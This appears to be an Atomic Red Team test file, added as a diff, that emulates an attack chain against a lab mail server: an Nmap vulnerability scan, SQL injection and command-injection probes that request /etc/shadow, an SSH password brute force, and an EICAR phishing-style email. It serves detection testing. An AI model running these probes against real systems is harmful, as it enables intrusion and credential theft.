@@ -1,0 +1,89 @@
+# Set-ExecutionPolicy Bypass -Scope Process -Force
+# Invoke-AtomicTest WEB_ATK_2 -TimeoutSecond 600 -PathToAtomicsFolder "C:\KichBan"       
+attack_technique: T1190
+display_name: Mail Server Attack Emulation Kill Chain
+
+atomic_tests:
+  - name: T1595.002 - Vulnerability Scanning (Nmap NSE)
+    auto_generated_guid: c3d4e5f6-a7b8-9012-3456-789abcdef012
+    description: |
+      Nmap Scripting Engine (NSE) to automatically scan for known vulnerabilities in Web (8080) and Mail (25, 143) applications.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $nmapPath = "C:\Program Files (x86)\Nmap\nmap.exe"
+        if (-not (Test-Path $nmapPath)) { $nmapPath = "C:\Program Files\Nmap\nmap.exe" }
+        Write-Host "[*] [T1595.002] Dang chay Nmap Vuln Scan..." -ForegroundColor Cyan
+        & $nmapPath -sV --script vuln -p 8080,25,143,993 192.168.1.2 -T4
+
+  - name: T1190 - Exploit Public-Facing Application (Malicious Web Probes)
+    auto_generated_guid: d4e5f6a7-b8c9-0123-4567-89abcdef0123
+    description: |
+      Malicious HTTP payload sending (SQLi, LFI, Command Injection) and user-agent spoofing are common attack tools.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $target = "http://192.168.1.2:8080"
+        Write-Host "[*] [T1190] Web Payload..." -ForegroundColor Cyan
+        
+        # Faking User-Agent Sqlmap and SQLi
+        $headers = @{"User-Agent"="sqlmap/1.5.8#dev (http://sqlmap.org)"}
+        $sqli_url = "$target/index.php?mail=admin' OR 1=1--"
+        try { Invoke-WebRequest -Uri $sqli_url -Headers $headers -UseBasicParsing -TimeoutSec 5 | Out-Null } catch { }
+        
+        # Payload Command Injection (RCE)
+        $headers2 = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Nmap/7.94"}
+        $rce_url = "$target/?cmd=cat+/etc/shadow"
+        try { Invoke-WebRequest -Uri $rce_url -Headers $headers2 -UseBasicParsing -TimeoutSec 5 | Out-Null } catch { }
+
+  - name: T1110.001 - Brute Force (SSH Password Guessing)
+    auto_generated_guid: e5f6a7b8-c9d0-1234-5678-9abcdef01234
+    description: |
+      Using Nmap to perform SSH password brute-force (port 22) with a small dictionary list, simulating login attempt behavior.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $nmapPath = "C:\Program Files (x86)\Nmap\nmap.exe"
+        if (-not (Test-Path $nmapPath)) { $nmapPath = "C:\Program Files\Nmap\nmap.exe" }
+        Write-Host "[*] [T1110.001] Creating dictionary and SSH Brute Force..." -ForegroundColor Cyan
+        
+        # temp dictionary
+        "root`nadmin`nubuntu`nmail" | Out-File -FilePath "$env:TEMP\users.txt" -Encoding ascii
+        "123456`npassword`nadmin123`nqwerty" | Out-File -FilePath "$env:TEMP\pass.txt" -Encoding ascii
+        
+        #  Nmap brute force
+        & $nmapPath -p 22 --script ssh-brute --script-args userdb="$env:TEMP\users.txt",passdb="$env:TEMP\pass.txt" 192.168.1.2 -T4
+        
+        Remove-Item "$env:TEMP\users.txt", "$env:TEMP\pass.txt" -ErrorAction SilentlyContinue
+
+  - name: T1566.001 - Spearphishing Attachment (SMTP Malware Simulation)
+    auto_generated_guid: f6a7b8c9-d0e1-2345-6789-abcdef012345
+    description: |
+      Connect directly to port 25 (SMTP) and send an email containing the standard EICAR malware signature to test the IDS/Mail Filter's ability to capture the payload.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        Write-Host "[*] [T1566.001] Sending Malicious Email (EICAR) Through SMTP..." -ForegroundColor Cyan
+        $smtpServer = "192.168.1.2"
+        $eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+        
+        try {
+            $smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, 25)
+            $msg = New-Object System.Net.Mail.MailMessage("attacker@evil.com", "admin@mailovncr.com", "Important Invoice Document", "Vui long mo file dinh kem de xem hoa don. `n`n$eicarString")
+            $smtp.Send($msg)
+            Write-Host "[+] Success" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] Error: $_" -ForegroundColor Yellow
+        }
